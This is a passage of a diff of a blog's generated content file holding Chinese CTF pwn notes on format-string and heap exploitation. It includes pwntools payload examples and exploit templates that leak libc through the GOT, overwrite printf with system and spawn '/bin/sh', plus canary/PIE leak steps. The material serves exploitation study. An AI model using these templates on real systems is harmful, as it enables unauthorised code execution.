class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;byte&#x27;)</span><br><span class="line">b&#x27;%190c%7$lln%85c%8$hhn%36c%9$hhn%131c%10$hhnaaaab\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">context.clear(arch = &#x27;i386&#x27;)</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;int&#x27;)</span><br><span class="line">b&#x27;%322419390c%5$na\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;short&#x27;)</span><br><span class="line">b&#x27;%4919c%7$hn%42887c%8$hna\x02\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;byte&#x27;)</span><br><span class="line">b&#x27;%19c%12$hhn%36c%13$hhn%131c%14$hhn%4c%15$hhn\x03\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x00000001&#125;, write_size=&#x27;byte&#x27;)</span><br><span class="line">b&#x27;c%3$naaa\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: b&quot;\xff\xff\x04\x11\x00\x00\x00\x00&quot;&#125;, write_size=&#x27;short&#x27;)</span><br><span class="line">b&#x27;%327679c%7$lln%18c%8$hhn\x00\x00\x00\x00\x03\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(10, &#123;0x404048 : 0xbadc0ffe, 0x40403c : 0xdeadbeef&#125;, no_dollars=True)</span><br><span class="line">b&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%125c%hhn%17c%hhn%32c%hhn%17c%hhn%203c%hhn%34c%hhn%3618c%hnacccc&gt;@@\x00cccc=@@\x00cccc?@@\x00cccc&lt;@@\x00ccccK@@\x00ccccJ@@\x00ccccH@@\x00&#x27;</span><br><span class="line">fmtstr_payload(6, &#123;0x404048 : 0xbadbad00&#125;, no_dollars=True)</span><br><span class="line">b&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%229c%hhn%173c%hhn%13c%hhn%33c%hhnccccH@@\x00ccccI@@\x00ccccK@@\x00ccccJ@@\x00&#x27;</span><br><span class="line">fmtstr_payload(6, &#123;0x4040 : 0xbadbad00, 0x4060: 0xbadbad02&#125;, no_dollars=True)</span><br><span class="line">b&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%212c%hhn%173c%hhn%13c%hhn%33c%hhn%39c%hhn%171c%hhn%13c%hhn%33c%hhnacccc@@\x00\x00ccccA@\x00\x00ccccC@\x00\x00ccccB@\x00\x00cccc`@\x00\x00cccca@\x00\x00ccccc@\x00\x00ccccb@\x00\x00&#x27;</span><br></pre></td></tr></table></figure>
+<h1 id="ctf-中的题型">CTF 中的题型</h1>
+<h2 id="栈上">栈上</h2>
+<h3 id="位">32位</h3>
+<blockquote>
+<p>最基础的题目，fmtstr_payload一把梭，模板如下</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 确认偏移量</span></span><br><span class="line">payload = <span class="string">&#x27;%p-&#x27;</span>*<span class="number">10</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设 offset=6，泄露libc基址</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload    = p32(printf_got) + <span class="string">b&#x27;%6$s&#x27;</span></span><br><span class="line"><span class="comment"># payload  = b&#x27;%7$s&#x27; + p32(printf_got)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确认libc</span></span><br><span class="line">printf_addr = u32(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">3</span>:])</span><br><span class="line">libc        = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line">libc_base   = printf_addr - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收程序信息，向程序发送payload</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf_got:system_addr&#125;,numbwritten=<span class="number">0</span>,write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提权</span></span><br><span class="line">io.sendline(<span class="string">&#x27;;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="位-1">64位</h3>
+<blockquote>
+<p>由于许多地址只有六字节，所以为了对齐八字节，我们需要用''来填充，但''会截断
+printf 的输出，所以我们需要让 printf 先输出格式化字符.</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确认偏移量</span></span><br><span class="line">payload = <span class="string">&#x27;%p-&#x27;</span>*<span class="number">10</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设 offset=6，泄露libc基址</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload  = <span class="string">b&#x27;%7$sAAAA&#x27;</span> + p64(printf_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确认libc</span></span><br><span class="line">printf_addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc        = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line">libc_base   = printf_addr - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收程序信息，向程序发送payload</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf_got:system_addr&#125;,numbwritten=<span class="number">0</span>,write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提权</span></span><br><span class="line">io.sendline(<span class="string">&#x27;;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="非栈上bss段">非栈上(BSS段)</h2>
+<p>2023moeCTF的第三道fmt就是这种题目，exp在本地，后续有时间更新</p>
+<h2 id="特殊情况">特殊情况</h2>
+<h3 id="一次printf就返回">一次printf就返回</h3>
+<blockquote>
+<p>printf 的要求十分严格，通常有两种做法</p>
+</blockquote>
 <ol type="1">
-<li>编译步骤： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Source Code                --&gt; </span><br><span class="line">Lexical Analysis(词法分析)  --(token)--&gt; </span><br><span class="line">Syntax Analysis(语法分析)   --(AST)--&gt; </span><br><span class="line">Semantic Analysis(句法分析) --(Decorated AST)--&gt; </span><br><span class="line">Lifted   --(IR)--&gt; (主要在这一步进行静态分析)</span><br><span class="line">Code generate              --&gt; </span><br><span class="line">Machine Code</span><br></pre></td></tr></table></figure></li>
-</ol>
-]]></content>
-      <categories>
-        <category>Software analysis technology</category>
-      </categories>
-      <tags>
-        <tag>Wifi</tag>
-        <tag>Notes</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Pwn - Heap Exploit Summary</title>
-    <url>/2023/09/22/Pwn%20-%20Heap%20Exploit%20Summary/</url>
-    <content><![CDATA[<blockquote class="blockquote-center">
-总结一下 Heap 的相关内容，便于后续调用
-</blockquote>
-<span id="more"></span>
-<h1 id="patchelf的使用方式">Patchelf的使用方式</h1>
-<blockquote>
-<p>在本地调试堆题时，不同的 libc 版本会有不同的 heap 管理器来管理
-heap，因此我们需要将本地的 elf 文件的链接部分 patch
-一下，使其与远程链接的 libc 文件保持一致。</p>
-</blockquote>
-<h2 id="libc-包的下载">libc 包的下载</h2>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以下操作均在文件夹 glibc-all-in-one 中完成</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看有什么版本的 libc 可以下载</span></span><br><span class="line">./update_list // 更新 list</span><br><span class="line">cat list</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载所需要的 libc 包</span></span><br><span class="line">./download 2.35-0ubuntu3_amd64</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>有时我们需要的 libc 包不在 list
-中，我们可以自己尝试解构命令来下载。</p>
-</blockquote>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">访问https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/，查看所有可以下载的 libc 版本</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载压缩包(到文件夹glibc-all-in-one/debs)以后用 extract 命令解压缩</span></span><br><span class="line">./extract debs/libc6_2.26-0ubuntu2_i386.deb /tmp/test</span><br></pre></td></tr></table></figure>
-<h2 id="patch-elf文件">patch elf文件</h2>
-<blockquote>
-<p>识别需要 patch 的文件 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[path/to/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64]</span><br><span class="line">└─$ ls</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">找到以下文件</span><br><span class="line">ld-linux-x86-64.so.2  # ld-2.23.so 也行</span><br></pre></td></tr></table></figure></p>
-</blockquote>
-<p>tip1：高版本的libc库没有 <code>ld-2.23.so</code> 这种文件，但它与
-<code>ld-linux-x86-64.so.2</code>
-等价，都指向相同的动态链接器文件，他们实际上是同一个文件的不同名称。</p>
-<p>tip2：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">被patch的elf文件: Pwn</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置动态链接器 ld.so</span></span><br><span class="line">patchelf --set-interpreter path/to/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-linux-x86-64.so.2 pwn </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置链接库</span> </span><br><span class="line">patchelf --set-rpath  path/to/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ pwn</span><br></pre></td></tr></table></figure>
-<h1 id="tcachebin">Tcachebin</h1>
-<h2 id="trait">Trait</h2>
-<ul>
-<li><p>FIFO</p></li>
-<li><p>libc相关性</p>
-<ul>
-<li>2.26以后开始出现 tcachebin.</li>
-<li></li>
-</ul></li>
-</ul>
-<h1 id="fastbin">Fastbin</h1>
-<h2 id="trait-1">Trait</h2>
-<ul>
-<li>FIFO</li>
-</ul>
-<h1 id="unsortedbin">Unsortedbin</h1>
-<h2 id="trait-2">Trait</h2>
-<ul>
-<li>LIFO</li>
-</ul>
-<p>当unsortedbin中有且仅有一个chunk时，该chunk的fd和bk会指向unsortdedbin的地址</p>
-<p>而这个地址可以用ida查看对应libc的malloc_trim函数找到</p>
-<h2 id="write">write</h2>
-<p>write是指</p>
-<p>此外，低libc版本的unsortedbin可以像tcachebin一样，通过伪造链来申请一个fake_chunk</p>
-<ul>
-<li>申请fake_chunk <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">**2.23版本**  </span><br><span class="line">- 初状态  </span><br><span class="line">unsortedbin --&gt; chunk_victim  </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">此时我们令chunk_victim.bk = fake_chunk_head</span></span><br><span class="line"></span><br><span class="line">- 末状态  </span><br><span class="line">unsortedbin  --&gt; chunk_victim --&gt; fake_chunk</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">连续申请两个chunk即可申请到fake_chunk</span></span><br></pre></td></tr></table></figure></li>
-</ul>
-<h1 id="largebin-attack">Largebin Attack</h1>
-<h1 id="section"></h1>
-<h1 id="use-after-free">Use After Free</h1>
-<ul>
-<li><strong>概述</strong>
-在<code>free(chunk_ptr)</code>后并没有<code>chunk_ptr=0</code>，导致我们仍然能通过<code>chunk_ptr</code>对这个chunk进行修改</li>
-<li>Fastbin Attack</li>
-<li></li>
-</ul>
-<h1 id="houseoforange">HouseofOrange</h1>
-<h2 id="概述">概述</h2>
-<p>HouseofOrange是在程序没有可以操控的free时，利用ptmalloc的管理机制强行制造出一个unsortedbin中的chunk的技术。</p>
-<h2 id="伪造chunk需求">伪造chunk需求</h2>
+<li>要求：栈上有一串具有三个函数的rbp的链，NO PIE，libc已知
 <ol type="1">
-<li><p>top_chunk的结束地址必须页对齐</p>
-<ul>
-<li>一般情况下，ptmalloc设置top_chunk为0x21000，我们申请一个0x10的chunk0后，chunk0加上chunk_head是0x20大小，此时top_chunk切割后还剩下0x20fe0大小，为了页对齐，我们伪造top_chunk的大小为0xfe0即可</li>
-</ul></li>
-<li><p>top_chunk.size &gt;= MINSIZE</p></li>
-<li><p>top_chunk.size &lt; chunk_size + MINSIZE</p></li>
-<li><p>top_chunk.prev_inuse == 1</p>
-<ul>
-<li>第一点中说的0xfe0要变为0xfe1</li>
-</ul></li>
+<li>做法：在栈上布满one_gadget，然后找到一条带有3个rbp的链，修改中间一个
+node 的低字节，让其指向的rbp变低，进而在返回时可以直接返回og</li>
+</ol></li>
+<li><a
+href="https://www.freebuf.com/articles/system/385029.html">打fini_array（未学习）</a></li>
 </ol>
+<h3 id="full-relro">FULL RELRO</h3>
+<blockquote>
+<p>FULL RELRO 意味着我们不能修改 got 表，所以我们需要修改返回地址</p>
+</blockquote>
+<p>要求：可以 printf
+的次数较多(至少多于四次)，可以让我们将返回地址修改为 one_gadget</p>
+<h3 id="piecanary-bypass">PIE/Canary bypass</h3>
+<blockquote>
+<p>假设调用链为 main-&gt;func-&gt;printf，而在 func 中存放着 fmt，则栈中
+fmt
+上方不远处一定有调用printf语句的下一句(PC+4)，即返回地址，和canary</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">假设偏移量为6，栈构造如下</span><br><span class="line">---printf栈帧---</span><br><span class="line">................</span><br><span class="line"> printf_canary    &lt;- offset = 3</span><br><span class="line">   printf_rbp     &lt;- offset = 4</span><br><span class="line">printf_ret_addr   &lt;- offset = 5</span><br><span class="line">---printf栈帧---</span><br><span class="line"></span><br><span class="line">----func栈帧----</span><br><span class="line">      fmt         &lt;- offset = 6</span><br><span class="line">----func栈帧----</span><br><span class="line"></span><br><span class="line">----main栈帧----</span><br><span class="line">...............</span><br><span class="line">----main栈帧----</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">泄露 pie_base &amp; canary</span></span><br><span class="line">payload = &#x27;%3$p-%5$p-END&#x27;</span><br><span class="line">io.sendline(payload)</span><br><span class="line">func_addr,canary = [int(x,16) for x in io.recvuntil(&#x27;END&#x27;)[-35:-4].split(b&#x27;-&#x27;)]</span><br><span class="line">ret_offset = </span><br><span class="line">pie_base   = func_addr - ret_offset</span><br></pre></td></tr></table></figure>
+<h1 id="appendix">Appendix</h1>
+<h2
+id="pwnlib.fmtstr.fmtstr_payload源码">pwnlib.fmtstr.fmtstr_payload源码</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fmtstr_payload</span> (</span><br><span class="line">        offset,              <span class="comment"># 字符串在栈上的偏移量</span></span><br><span class="line">        writes,              <span class="comment"># &#123;target_addr:int_to_write&#125; 要写入的数字</span></span><br><span class="line">        numbwritten=<span class="number">0</span>,       <span class="comment"># printf 已经打印的字符数量</span></span><br><span class="line">        write_size=<span class="string">&#x27;byte&#x27;</span>,   <span class="comment"># 写入字节的大小</span></span><br><span class="line">        write_size_max=<span class="string">&#x27;long&#x27;</span>, <span class="comment"># </span></span><br><span class="line">        overflows=<span class="number">16</span>,        <span class="comment"># </span></span><br><span class="line">        strategy=<span class="string">&quot;small&quot;</span>,    <span class="comment"># 默认small，如果追求速度可以用fast模式</span></span><br><span class="line">        badbytes=<span class="built_in">frozenset</span>(),  <span class="comment"># </span></span><br><span class="line">        offset_bytes=<span class="number">0</span>,      <span class="comment"># </span></span><br><span class="line">        no_dollars=<span class="literal">False</span>     <span class="comment"># 是否有 $ 符号,比如不用 &#x27;%996$n&#x27;</span></span><br><span class="line">    ):</span><br><span class="line"></span><br><span class="line">    sz = WRITE_SIZE[write_size]</span><br><span class="line">    szmax = WRITE_SIZE[write_size_max]</span><br><span class="line">    all_atoms = make_atoms(writes, sz, szmax, numbwritten, overflows, strategy, badbytes)</span><br><span class="line"></span><br><span class="line">    fmt = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">        data_offset = (offset_bytes + <span class="built_in">len</span>(fmt)) // context.<span class="built_in">bytes</span></span><br><span class="line">        fmt, data = make_payload_dollar(offset + data_offset, all_atoms, numbwritten=numbwritten, no_dollars=no_dollars)</span><br><span class="line">        fmt = fmt + cyclic((-<span class="built_in">len</span>(fmt)-offset_bytes) % context.<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(fmt) + offset_bytes == data_offset * context.<span class="built_in">bytes</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;this is a bug ... format string building did not converge&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fmt + data</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>CTF_Theory</category>
@@ -1003,78 +994,87 @@ RELRO为什么可以改啊🤔</li>
       </tags>
   </entry>
   <entry>
-    <title>Pwn - Format String Summary</title>
-    <url>/2024/01/21/Pwn%20-%20Format%20String%20Summary/</url>
+    <title>Pwn - Heap Exploit Summary</title>
+    <url>/2023/09/22/Pwn%20-%20Heap%20Exploit%20Summary/</url>
     <content><![CDATA[<blockquote class="blockquote-center">
-总结一下格式化字符串漏洞，便于后续调用
+总结一下 Heap 的相关内容，便于后续调用
 </blockquote>
 <span id="more"></span>
-<h1 id="原理-工具">原理 &amp; 工具</h1>
-<h2 id="原理">原理</h2>
+<h1 id="patchelf的使用方式">Patchelf的使用方式</h1>
 <blockquote>
-<p>本质是利用 printf(string) 任意地址读写</p>
+<p>在本地调试堆题时，不同的 libc 版本会有不同的 heap 管理器来管理
+heap，因此我们需要将本地的 elf 文件的链接部分 patch
+一下，使其与远程链接的 libc 文件保持一致。</p>
 </blockquote>
+<h2 id="libc-包的下载">libc 包的下载</h2>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以下操作均在文件夹 glibc-all-in-one 中完成</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看有什么版本的 libc 可以下载</span></span><br><span class="line">./update_list // 更新 list</span><br><span class="line">cat list</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载所需要的 libc 包</span></span><br><span class="line">./download 2.35-0ubuntu3_amd64</span><br></pre></td></tr></table></figure>
 <blockquote>
-<p>记录一下常用的格式</p>
+<p>有时我们需要的 libc 包不在 list
+中，我们可以自己尝试解构命令来下载。</p>
 </blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fmt    :        标准作用       ||           常用方式</span><br><span class="line">——————————————————————————————————————————————————————————————</span><br><span class="line">%p     :     输出栈上的内容     |  (读) 找偏移\pie_base\canary</span><br><span class="line">%s     :   输出地址指向的内容   ||     (读) 泄露libc_base</span><br><span class="line">%hhn   :   修改地址指向的byte   |        (写) 任意地址写</span><br><span class="line">%hn/%n : 修改地址指向的2/4bytes |        (写) 任意地址写</span><br></pre></td></tr></table></figure>
-<h2 id="工具-pwntools---fmtstr_payload">工具: Pwntools -
-fmtstr_payload</h2>
-<p><a href="https://docs.pwntools.com/en/stable/fmtstr.html">Pwntools -
-class fmtstr</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">访问https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/，查看所有可以下载的 libc 版本</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载压缩包(到文件夹glibc-all-in-one/debs)以后用 extract 命令解压缩</span></span><br><span class="line">./extract debs/libc6_2.26-0ubuntu2_i386.deb /tmp/test</span><br></pre></td></tr></table></figure>
+<h2 id="patch-elf文件">patch elf文件</h2>
 <blockquote>
-<p>源码见上述链接或文章末尾的 Appendix</p>
+<p>识别需要 patch 的文件 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[path/to/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64]</span><br><span class="line">└─$ ls</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">找到以下文件</span><br><span class="line">ld-linux-x86-64.so.2  # ld-2.23.so 也行</span><br></pre></td></tr></table></figure></p>
 </blockquote>
-<p>fmtstr是一个类，我们只需要用其中的 fmtstr_payload 来构造我们的
-payload 即可。现在版本的 pwntools 已经支持 64 位的 格式化字符串 payload
-生成了。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Default: numbwritten=0 , write_size=<span class="string">&#x27;byte&#x27;</span></span></span><br><span class="line">payload = fmtstr_payload(offset, writes, numbwritten=, write_size=&#x27;&#x27;)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Example:</span></span><br><span class="line">context.clear(arch = &#x27;amd64&#x27;)</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;int&#x27;)</span><br><span class="line">b&#x27;%322419390c%4$llnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;short&#x27;)</span><br><span class="line">b&#x27;%47806c%5$lln%22649c%6$hnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;byte&#x27;)</span><br><span class="line">b&#x27;%190c%7$lln%85c%8$hhn%36c%9$hhn%131c%10$hhnaaaab\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">context.clear(arch = &#x27;i386&#x27;)</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;int&#x27;)</span><br><span class="line">b&#x27;%322419390c%5$na\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;short&#x27;)</span><br><span class="line">b&#x27;%4919c%7$hn%42887c%8$hna\x02\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;byte&#x27;)</span><br><span class="line">b&#x27;%19c%12$hhn%36c%13$hhn%131c%14$hhn%4c%15$hhn\x03\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x00000001&#125;, write_size=&#x27;byte&#x27;)</span><br><span class="line">b&#x27;c%3$naaa\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: b&quot;\xff\xff\x04\x11\x00\x00\x00\x00&quot;&#125;, write_size=&#x27;short&#x27;)</span><br><span class="line">b&#x27;%327679c%7$lln%18c%8$hhn\x00\x00\x00\x00\x03\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(10, &#123;0x404048 : 0xbadc0ffe, 0x40403c : 0xdeadbeef&#125;, no_dollars=True)</span><br><span class="line">b&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%125c%hhn%17c%hhn%32c%hhn%17c%hhn%203c%hhn%34c%hhn%3618c%hnacccc&gt;@@\x00cccc=@@\x00cccc?@@\x00cccc&lt;@@\x00ccccK@@\x00ccccJ@@\x00ccccH@@\x00&#x27;</span><br><span class="line">fmtstr_payload(6, &#123;0x404048 : 0xbadbad00&#125;, no_dollars=True)</span><br><span class="line">b&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%229c%hhn%173c%hhn%13c%hhn%33c%hhnccccH@@\x00ccccI@@\x00ccccK@@\x00ccccJ@@\x00&#x27;</span><br><span class="line">fmtstr_payload(6, &#123;0x4040 : 0xbadbad00, 0x4060: 0xbadbad02&#125;, no_dollars=True)</span><br><span class="line">b&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%212c%hhn%173c%hhn%13c%hhn%33c%hhn%39c%hhn%171c%hhn%13c%hhn%33c%hhnacccc@@\x00\x00ccccA@\x00\x00ccccC@\x00\x00ccccB@\x00\x00cccc`@\x00\x00cccca@\x00\x00ccccc@\x00\x00ccccb@\x00\x00&#x27;</span><br></pre></td></tr></table></figure>
-<h1 id="ctf-中的题型">CTF 中的题型</h1>
-<h2 id="栈上">栈上</h2>
-<h3 id="位">32位</h3>
-<blockquote>
-<p>最基础的题目，fmtstr_payload一把梭，模板如下</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 确认偏移量</span></span><br><span class="line">payload = <span class="string">&#x27;%p-&#x27;</span>*<span class="number">10</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设 offset=6，泄露libc基址</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload    = p32(printf_got) + <span class="string">b&#x27;%6$s&#x27;</span></span><br><span class="line"><span class="comment"># payload  = b&#x27;%7$s&#x27; + p32(printf_got)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确认libc</span></span><br><span class="line">printf_addr = u32(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">3</span>:])</span><br><span class="line">libc        = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line">libc_base   = printf_addr - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收程序信息，向程序发送payload</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf_got:system_addr&#125;,numbwritten=<span class="number">0</span>,write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提权</span></span><br><span class="line">io.sendline(<span class="string">&#x27;;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<h3 id="位-1">64位</h3>
-<blockquote>
-<p>由于许多地址只有六字节，所以为了对齐八字节，我们需要用''来填充，但''会截断
-printf 的输出，所以我们需要让 printf 先输出格式化字符.</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确认偏移量</span></span><br><span class="line">payload = <span class="string">&#x27;%p-&#x27;</span>*<span class="number">10</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设 offset=6，泄露libc基址</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload  = <span class="string">b&#x27;%7$sAAAA&#x27;</span> + p64(printf_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确认libc</span></span><br><span class="line">printf_addr = u64(io.recvuntil(<span 